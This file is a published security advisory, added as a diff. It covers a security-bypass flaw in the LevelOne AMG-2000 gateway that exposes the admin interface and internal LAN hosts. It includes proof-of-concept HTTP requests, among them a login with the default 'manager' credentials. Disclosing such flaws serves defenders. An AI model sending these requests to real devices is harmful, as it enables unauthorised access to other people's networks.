@@ -1,0 +1,36 @@
+source: http://www.securityfocus.com/bid/34760/info
+
+LevelOne AMG-2000 is prone to a security-bypass vulnerability.
+
+Attackers may exploit this issue to gain access to the administrative interface and internal computers from an outside network. This may aid in further attacks.
+
+Note that valid authentication credentials must still be provided to authenticate to the device's administrative interface. Attackers may use default accounts such as 'operator' or 'manager' if the default passwords have not been changed.
+
+LevelOne AMG-2000 running firmware 2.00.00build00600 and prior versions are affected.
+
+The following examples are available:
+
+HTTP request to access the administration interface login page from the WLAN
+
+
+GET http://127.0.0.1/ HTTP/1.1
+Host: 192.168.0.1:2128
+[...]
+
+
+HTTP request to login to the admin interface with the user "manager"
+
+
+POST http://127.0.0.1/check.shtml HTTP/1.1
+Host: 192.168.0.1:2128
+[...]
+
+username=manager&password=manager&Submit=ENTER
+
+
+HTTP request to access other internal IP addresses configured on the private LAN port
+
+
+GET http://10.0.0.1/ HTTP/1.1
+Host: 192.168.0.1:2128
+[...] 
